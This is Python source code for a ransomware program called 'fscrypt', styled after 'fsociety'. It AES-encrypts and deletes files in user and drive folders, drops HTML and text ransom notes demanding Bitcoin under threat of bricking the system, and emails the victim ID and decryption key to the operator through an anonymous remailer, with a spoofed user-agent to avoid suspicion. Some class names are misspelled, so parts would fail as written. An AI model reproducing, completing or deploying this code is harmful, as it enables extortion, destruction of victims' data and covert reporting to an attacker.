from Crypto.Cipher import AES
from Crypto import Random
from hashlib import md5
from random import randint

import os
import sys
import time
import urllib2
import platform
import mechanize
import webbrowser
import subprocess


class Node:
    def __init__(self):
        self.data = None # contains the data
        self.next = None # contains the reference to the next node


class LinkedList:
    def __init__(self):
        self.first_node = None

    def add_node(self, data):
        new_node = node()
        new_node.data = data
        new_node.next = self.first_node
        self.first_node = new_node

    def delete_node(self, data):
        prev = None
        node = self.first_node
        
        while node:
            if node.data == data:
                if node == self.first_node:
                    self.first_node = self.first_node.next
                    return 1
                else:
                    prev.next = node.next
                    return 1
            else:
                prev = node
                node = node.next

    def list_print(self):
        node = self.first_node
        while node:
            print node.data,
            node = node.next
        print

    # method to get a node's data by index.
    def get_by_index(self, index):
        self.count = 1
        node = self.first_node

        while node:
            if self.count == index:
                return node.data
            else:
                node = node.next
                self.count += 1


class Fscrypt(object):

    def __init__(self):
        self.cwd        = os.getcwd()
        self.path_enc   = None
        self.id         = '' # identify code
        self.password   = '' # encryption key
        self.ipv4_addr  = '' # public ipv4 addr
        self.file_count = 0
        self.os_name    = None
        self.os_release = None
        self.btc_addr   = 'address_of_your_btc_wallet'

        # variables for reporting
        self.recipient  = "some@email.address"
        self.subject    = ''
        self.msg_cont   = ''


    def set_sysinfo(self):
        if platform.system() == 'Linux':
            self.os_name = 'Linux'
        elif platform.system() == 'Windows':
            self.os_name = 'Windows'
        else:
            pass

        self.os_release = platform.release()


    def idgen(self):
        # generating key.
        ll = LinkedList()

        # initialize the element linked list.
        for i in range(0,69):
            ll.add_node(68-i)

        # grab element from the linked list.
        num_total = 69
        for i in range(0,69):
            index = randint(1, num_total)
            temp = ll.get_by_index(index)
            self.id += str(temp)
            ll.delete_node(temp)
            num_total -= 1


    def keygen(self):
        # generating key.
        ll = linked_list()

        # initialize the element linked list.
        for i in range(0,69):
            ll.add_node(68-i)

        # grab element from the linked list.
        num_total = 69
        for i in range(0,69):
            index = randint(1, num_total)
            temp = ll.get_by_index(index)
            self.password += str(temp)
            ll.delete_node(temp)
            num_total -= 1


    def get_ipv4(self):
        while True:
            try:
                # we have to make sure that the encryption process will only start
                # when the victim is connected to the Internet.
                # or the id and key will not be sent.
                return urllib2.urlopen('http://ip.42.pl/raw').read()
            except urllib2.URLError, e:
                print "[-] No Internet connection! Unable to connect..."
                # check connection every 5 minutes.
                time.sleep(300)



    def derive_key_and_iv(self, password, salt, key_length, iv_length):
        d = d_i = ''
        while len(d) < key_length + iv_length:
            d_i = md5(d_i + password + salt).digest()
            d += d_i
        return d[:key_length], d[key_length:key_length+iv_length]


    def encrypt(self, in_file, out_file, password, key_length=32):
        bs = AES.block_size
        salt = Random.new().read(bs - len('Salted__'))
        key, iv = self.derive_key_and_iv(password, salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        out_file.write('Salted__' + salt)
        finished = False
        while not finished:
            chunk = in_file.read(1024 * bs)
            if len(chunk) == 0 or len(chunk) % bs != 0:
                padding_length = (bs - len(chunk) % bs) or bs
                chunk += padding_length * chr(padding_length)
                finished = True
            out_file.write(cipher.encrypt(chunk))


    def encrypt_folder(self, path):
        for dirname, dirnames, filenames in os.walk(path):

            # print path to all filenames.
            for filename in filenames:
                try:
                    # call the encrypt function.
                    with open(os.path.join(self.cwd, dirname, filename), 'rb') as in_file, open(os.path.join(self.cwd, dirname,filename) + ".fuxsc", 'wb') as out_file:
                        self.encrypt(in_file, out_file, self.password)

                    # delete the original file after encrypting it.
                    os.remove(os.path.join(self.cwd, dirname, filename))

                    # update the counter.
                    self.file_count += 1

                except:
                    # catch exception to deal with permission denied problem.
                    continue

            # Advanced usage:
            # editing the 'dirnames' list will stop os.walk() from recursing into there.
            if '.git' in dirnames:
                # don't go into any .git directories.
                dirnames.remove('.git')


    def decrypt(self, in_file, out_file, password, key_length=32):
        bs = AES.block_size
        salt = in_file.read(bs)[len('Salted__'):]
        key, iv = self.derive_key_and_iv(password, salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        next_chunk = ''
        finished = False
        while not finished:
            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))
            if len(next_chunk) == 0:
                padding_length = ord(chunk[-1])
                chunk = chunk[:-padding_length]
                finished = True
            out_file.write(chunk)


    def decrypt_folder(self, path):
        # decrypt all files under the specified directory.
        for dirname, dirnames, filenames in os.walk(path):

            # print path to all filenames.
            for filename in filenames:

                # this file cannot be decrypted, so do not perform decryption on this one.
                if filename == "NOTICE.html" or filename == "notice.txt":
                    continue

                # call the decrypt function.
                with open(os.path.join(self.cwd, dirname,filename), 'rb') as in_file, open(os.path.join(self.cwd, dirname,filename)[:-6], 'wb') as out_file:
                    self.decrypt(in_file, out_file, self.password)

                # delete the original file after encrypting it.
                os.remove(os.path.join(self.cwd, dirname, filename))

            # Advanced usage:
            # editing the 'dirnames' list will stop os.walk() from recursing into there.
            if '.git' in dirnames:
                # don't go into any .git directories.
                dirnames.remove('.git')


    def report_info(self):
        br = mechanize.Browser()

        # setting and importing variables
        self.subject = 'fscrypt - New Infection from ' + self.ipv4_addr
        self.msg_cont = 'Identification Code: ' + self.id + '\nDecryption Key: ' + self.password + '\nOS Info: ' + self.os_name + self.os_release + '\nFirst Connect: ' + self.ipv4_addr + '\n \n\n'

        url     = "http://anonymouse.org/anonemail.html"
        to      = self.recipient
        subject = self.subject
        message = self.msg_cont

        # including headers(User-Agent) so that it looks legit
        headers = "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)"
        br.addheaders = [('User-agent', headers)]
        br.open(url)

        # adding some configurations to prevent suspicion and other stuff
        br.set_handle_equiv(True)
        br.set_handle_gzip(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_debug_http(False)
        br.set_debug_redirects(False)

        br.select_form(nr=0)
        br.form['to'] = to
        br.form['subject'] = subject
        br.form['text'] = message

        result = br.submit()


    def start(self):
        # detect and set system info
        self.set_sysinfo()

        # idgen
        self.idgen()
        print "[*] Session ID: " + self.id

        # keygen (generate two rounds for 256 bits long key)
        for i in range(0,2):
            self.keygen()
        print "[*] Session Key: " + self.password

        # print banner
        print
        print " fscrypt"
        print " fsociety ransomware"
        print " Version: Dev-1.0.1"
        print " Host OS: " + self.os_name + self.os_release
        print "================================================="
        print " [*] Available Actions:"
        print "     (1) Encrypt disk"
        print "     (2) Decrypt disk"
        print

        # get victim ip addr
        self.ipv4_addr = self.get_ipv4()

        # setting encryption path.
        if self.os_name == 'Linux':
            #self.path_enc = os.getenv('HOME')
            self.path_enc = '/home/aesophor/sim_home'
            pass

        elif self.os_name == 'Windows':
            #self.path_enc = 'C:/Users/' + os.getenv('username')
            self.path_enc = 'C:/Users/' + os.getenv('username') + 'sim_home'
            pass

        while True:
            try:
                self.choice = raw_input("[fscrypt] > ")

                if self.choice == '1':
                    print "[*] fscrypt encryption initialized."
                    
                    # encrypt all files under user(for Linux and Windows), D:\ and E:\ (for Windows)
                    self.encrypt_folder(self.path_enc)
                    self.encrypt_folder('D:/')
                    self.encrypt_folder('E:/')

                    # write html popup to user desktop.
                    self.f = open(self.path_enc + '/Desktop/NOTICE.html', 'w+')
                    self.html_notice = '<HEAD>\n<TITLE>#OPfuxsocy</TITLE>\n</HEAD>\n<BODY BGCOLOR="BLACK">\n<BODY TEXT="RED">\n<CENTER>\n<H1><br>#OPfuxsocy<br></H1>\n<H2>Your files are now encrypted.</H3>\n<H5>To get the key to decrypt files you have to pay 0.95 BTC.</H4>\n<H5>If the payment is not made in 7 days, we will brick your entire system.</H4>\n<H3>...</H3>\n<H4>Bitcoin address: ' + self.btc_addr + '</H3>\n<H3>...</H3>\n<H5>Your System: ' + self.os_name + self.os_release +' | First Connected: ' + self.ipv4_addr + ' | Total encrypted ' + str(self.file_count) + ' files. </H5>\n<H5>For more info, check notice.txt on your desktop.</H5>\n<H5>More instruction forthcoming - fsociety.</H5>\n<IMG SRC="https://images.duckduckgo.com/iu/?u=https%3A%2F%2Ftse3.mm.bing.net%2Fth%3Fid%3DOIP.M81ae6592643d81ad79a6ac43ad14e719o1%26pid%3D15.1&f=1">\n</CENTER>'
                    self.f.write(self.html_notice)
                    self.f.close()

                    # write txt notice to user desktop
                    self.f = open(self.path_enc + '/Desktop/notice.txt', 'w+')
                    self.txt_notice = '#OPfuxsocy\n------------------------------------------------------------------------------------------------------\nYour files are now encrypted. To get the key to decrypt the files, you have to pay 0.95 BTC.\nIf the payment is not made in 7 days, we will brick your entire system.\n\n\n-Instructions on making payment:\n#1 You should register a Bitcoin Wallet.\n\n#2 Purchase Bitcoins - Although it is not yet easy to buy bitcoins, it is getting simpler every day.\n(Coin.mx, LocalBitcoins.com, bitquick.co, ...)\n\n#3 Send 0.95 BTC to Bitcoin Address: ' + self.btc_addr + '\n\n#4 Contact us via email: ' + self.recipient + ', send us BOTH your <Identification Code> and <Transaction ID (TXID)>.\n(You can find in detailed info about transaction you made.)\n\n#5 Activation may takes up to 48 hours. The moment we verify your payment, we will send you the decryption software and your unique key.\n\nIdentification Code:' + self.id + '\nBitcoin Address: ' + self.btc_addr + '\n\n\nfsociety'
                    self.f.write(self.txt_notice)
                    self.f.close()

                    # done. report to c&c.
                    self.report_info()

                    # display the notice.
                    webbrowser.open(self.path_enc + '/Desktop/NOTICE.html')
                    print "[*] fscrypt encryption finished. Total encrypted %i files." % self.file_count

                elif self.choice == '2':
                    print "[*] fscrypt decryption initialized."

                    self.password = raw_input("[+] Please enter the key the files were encrypted with : ")

                    self.confirm = raw_input("[*] Please double check. Is the key correct? (y/n)")
                    if self.confirm == 'n' or self.confirm == 'N':
                        print "[-] Session aborted."
                        return -1

                    # decrypt the files
                    self.decrypt_folder(self.path_enc)
                    self.decrypt_folder('D:/')
                    self.decrypt_folder('E:/')

                    print "[*] fscrypt decryption complete."

                else:
                    print "[-] Error."

            except KeyboardInterrupt:
                print "\n[-] Session ended as user requested."
                return -1


_fsransom = Fscrypt()
_fsransom.start()
